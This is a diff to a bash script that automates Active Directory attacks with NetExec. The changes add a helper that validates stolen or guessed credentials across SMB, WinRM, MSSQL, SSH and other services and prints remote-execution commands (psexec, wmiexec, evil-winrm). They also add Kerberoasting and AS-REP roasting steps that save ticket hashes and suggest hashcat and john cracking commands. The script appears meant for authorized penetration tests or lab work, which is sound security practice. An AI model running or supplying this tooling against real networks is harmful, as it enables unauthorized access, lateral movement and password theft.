@@ -34,16 +34,107 @@ nxc smb $IP -d $domain -u 'guest' -p '' # check for guest access
 
 echo -e "\n\033[96m[+] Checking Anonymous access\033[0m\n"
 nxc smb $IP -d $domain -u '' -p '' # check for anonymous access
-nxc smb $IP -d $domain -u 'user.d0es.n0t.eXist' -p ''
+
+
+
+# Helper function to run nxc and suggest login command if successful
+# Helper function to run nxc and suggest login command if successful
+check_and_suggest() {
+    service=$1
+    shift
+    echo "Checking $service..."
+    # Run the command and capture output
+    output=$("$@")
+    echo "$output"
+    
+    # Check for success indicator "[+]"
+    if echo "$output" | grep -q "+"; then
+        echo -e "\033[92m[+] Valid credentials for $service! Suggested command:\033[0m"
+        
+        case $service in
+            "smb")
+                # Suggest Impacket tools for SMB
+                echo -e "\033[93m[!] Impacket tools for SMB:\033[0m"
+                echo "impacket-psexec '$domain/$user:$pass@$IP'"
+                echo "impacket-smbexec '$domain/$user:$pass@$IP'"
+                
+                # Check for Admin access (Pwn3d!)
+                if echo "$output" | grep -q "Pwn3d!"; then
+                     echo -e "\033[92m[+] Admin access (Pwn3d!) detected - tools above will work!\033[0m"
+                else
+                     echo -e "\033[91m[!] Note: Admin tools above require elevated privileges\033[0m"
+                fi
+                echo ""
+
+                # Enumerate shares to see which ones are accessible
+                echo "Enumerating shares for suggestions..."
+                shares_output=$(nxc smb $IP -d $domain -u $user -p $pass --shares)
+                echo "$shares_output"
+                
+                echo -e "\n\033[92m[+] Suggested connections:\033[0m"
+                echo "$shares_output" | while read -r line; do
+                    # Clean color codes for parsing
+                    clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
+                    
+                    # Check for accessible shares (READ or WRITE)
+                    if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
+                        # Extract share name (it is the field before READ or WRITE)
+                        share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
+                        
+                        # Remove leading backslash if present
+                        share=${share#\\}
+                        
+                        if [ ! -z "$share" ]; then
+                            echo "smbclient -U '$domain/$user%$pass' //$IP/$share"
+                        fi
+                    fi
+                done
+                ;;
+            "wmi")
+                echo "impacket-wmiexec '$domain/$user:$pass@$IP'"
+                ;;
+            "winrm")
+                echo "evil-winrm -i $IP -u '$user' -p '$pass'"
+                ;;
+            "mssql")
+                echo "impacket-mssqlclient '$domain/$user:$pass@$IP'"
+                ;;
+            "ssh")
+                echo "ssh '$user@$IP'"
+                ;;
+            "ftp")
+                echo "ftp ftp://$user:$pass@$IP"
+                ;;
+            "vnc")
+                echo "vncviewer $IP"
+                ;;
+            "ldap")
+                # LDAP usually doesn't have a direct interactive shell, but we can suggest ldapsearch
+                echo "ldapsearch -x -H ldap://$IP -D \"$user@$domain\" -w '$pass' -b \"DC=${domain//./,DC=}\""
+                ;;
+        esac
+        echo ""
+    fi
+}
 
 echo -e "\n\033[96m[+] Validating credentials\033[0m\n"
-nxc smb $IP -d $domain -u $user -p $pass # Validate a  username and password against the SMB
-nxc ldap $IP -d $domain -u $user -p $pass # LDAP
-nxc winrm $IP -d $domain -u $user -p $pass # WinRM
-nxc mssql $IP -u $user -p $pass # MSSQL
-nxc ssh $IP -u $user -p $pass # SSH
-nxc ftp $IP -u $user -p $pass # FTP
-nxc vnc $IP -u $user -p $pass # VNC
+check_and_suggest smb nxc smb $IP -d $domain -u $user -p $pass --timeout 2
+check_and_suggest ldap nxc ldap $IP -d $domain -u $user -p $pass --timeout 2
+check_and_suggest winrm nxc winrm $IP -d $domain -u $user -p $pass --timeout 2
+check_and_suggest mssql nxc mssql $IP -u $user -p $pass --timeout 2
+check_and_suggest ssh nxc ssh $IP -u $user -p $pass --timeout 0.5
+check_and_suggest ftp nxc ftp $IP -u $user -p $pass --timeout 0.5
+check_and_suggest vnc nxc vnc $IP -u $user -p $pass --timeout 0.5
+
+# RPC check using rpcclient
+echo "Checking rpc..."
+rpc_output=$(rpcclient -U "$domain\\$user%$pass" $IP -c "getusername" 2>&1)
+if echo "$rpc_output" | grep -q "Account Name:"; then
+    echo -e "\033[92m[+] Valid credentials for rpc! Suggested command:\033[0m"
+    echo "rpcclient -U '$domain\\$user%$pass' $IP"
+    echo "impacket-rpcdump '$IP' -u '$user' -p '$pass' -d '$domain'"
+    echo ""
+fi
 # nxc rdp $IP -u $user -p $pass # RDP
 # nxc ftp $IP -u $user -p $pass # FTP
 
@@ -83,8 +174,6 @@ unbuffer nxc smb $IP -u $user -p $pass --local-groups | tee nxc-enum/smb/local-g
 echo -e "\n\033[96m[+] Dumping password policy\033[0m\n"
 unbuffer nxc smb $IP -u $user -p $pass --pass-pol | tee nxc-enum/smb/pw-policy.txt # dump password policy of the domain
 
-echo -e "\n\033[96m[+] Checking WinRM Access\033[0m\n"
-nxc winrm $IP -u $user -p $pass # check if credentials can be used with winRM
 
 echo -e "\n\033[96m[+] Trying to execute commands:\033[0m\n"
 nxc smb $IP -u $user -p $pass -x whoami # check if commands can be run
@@ -130,10 +219,58 @@ echo -e "\n\033[91m[+] Trusted For Delegation\033[0m\n"
 unbuffer nxc ldap $IP -u $user -p $pass --users --trusted-for-delegation | tee nxc-enum/ldap/trusted-for-delegation.txt
 
 echo -e "\n\033[91m[+] Kerberoasting\033[0m\n"
-unbuffer nxc ldap $IP -u $user -p $pass --kerberoasting nxc-enum/ldap/kerberoasting.txt
+rm -f nxc-enum/ldap/kerberoasting.txt kerberoasting.txt 2>/dev/null
+unbuffer nxc ldap $IP -u $user -p $pass --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt
+if [ -s nxc-enum/ldap/kerberoasting.txt ] && grep -q 'krb5tgs' nxc-enum/ldap/kerberoasting.txt 2>/dev/null; then
+    cp nxc-enum/ldap/kerberoasting.txt ./kerberoasting.txt
+    echo -e "\033[92m[+] Kerberoast hashes found! Saved to kerberoasting.txt\033[0m"
+    echo -e "\033[92m[+] Suggested cracking commands:\033[0m"
+    
+    # Detect hash type and suggest correct mode
+    if grep -q 'krb5tgs\$23\$' kerberoasting.txt 2>/dev/null; then
+        echo "# etype 23 (RC4-HMAC) detected"
+        echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
+        echo "hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
+    fi
+    if grep -q 'krb5tgs\$17\$' kerberoasting.txt 2>/dev/null; then
+        echo "# etype 17 (AES128-CTS-HMAC-SHA1-96) detected"
+        echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
+        echo "hashcat -m 19600 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
+    fi
+    if grep -q 'krb5tgs\$18\$' kerberoasting.txt 2>/dev/null; then
+        echo "# etype 18 (AES256-CTS-HMAC-SHA1-96) detected"
+        echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
+        echo "hashcat -m 19700 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
+    fi
+    echo ""
+fi
 
 echo -e "\n\033[91m[+] AS-REProasting\033[0m\n"
-unbuffer nxc ldap $IP -u $user -p $pass --asreproast nxc-enum/ldap/asreproasting.txt
+rm -f nxc-enum/ldap/asreproasting.txt asreproasting.txt 2>/dev/null
+unbuffer nxc ldap $IP -u $user -p $pass --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt
+if [ -s nxc-enum/ldap/asreproasting.txt ] && grep -q 'krb5asrep' nxc-enum/ldap/asreproasting.txt 2>/dev/null; then
+    cp nxc-enum/ldap/asreproasting.txt ./asreproasting.txt
+    echo -e "\033[92m[+] AS-REP hashes found! Saved to asreproasting.txt\033[0m"
+    echo -e "\033[92m[+] Suggested cracking commands:\033[0m"
+    
+    # Detect hash type and suggest correct mode
+    if grep -q 'krb5asrep\$23\$' asreproasting.txt 2>/dev/null; then
+        echo "# etype 23 (RC4-HMAC) detected"
+        echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
+        echo "hashcat -m 18200 asreproasting.txt /usr/share/wordlists/rockyou.txt"
+    fi
+    if grep -q 'krb5asrep\$17\$' asreproasting.txt 2>/dev/null; then
+        echo "# etype 17 (AES128-CTS-HMAC-SHA1-96) detected"
+        echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
+        echo "hashcat -m 19800 asreproasting.txt /usr/share/wordlists/rockyou.txt"
+    fi
+    if grep -q 'krb5asrep\$18\$' asreproasting.txt 2>/dev/null; then
+        echo "# etype 18 (AES256-CTS-HMAC-SHA1-96) detected"
+        echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
+        echo "hashcat -m 19900 asreproasting.txt /usr/share/wordlists/rockyou.txt"
+    fi
+    echo ""
+fi
 
 echo -e "\n\033[91m[+] Domain Controllers\033[0m\n"
 unbuffer nxc ldap $IP -u $user -p $pass --dc-list | tee nxc-enum/ldap/domain-controllers.txt
@@ -189,7 +326,7 @@ unbuffer nxc nfs $IP --shares | tee nxc-enum/smb/nfs-shares.txt
 echo -e "\n\033[96m[+] WMI Enumeration:\033[0m"
 
 echo -e "\n\033[91m[+] WMI Credentials Check\033[0m\n"
-unbuffer nxc wmi $IP -u $user -p $pass | tee nxc-enum/smb/wmi-credentials.txt
+check_and_suggest wmi unbuffer nxc wmi $IP -u $user -p $pass | tee nxc-enum/smb/wmi-credentials.txt
 
 echo -e "\n\033[91m[+] WMI Command Execution (whoami)\033[0m\n"
 unbuffer nxc wmi $IP -u $user -p $pass -x whoami | tee nxc-enum/smb/wmi-whoami.txt
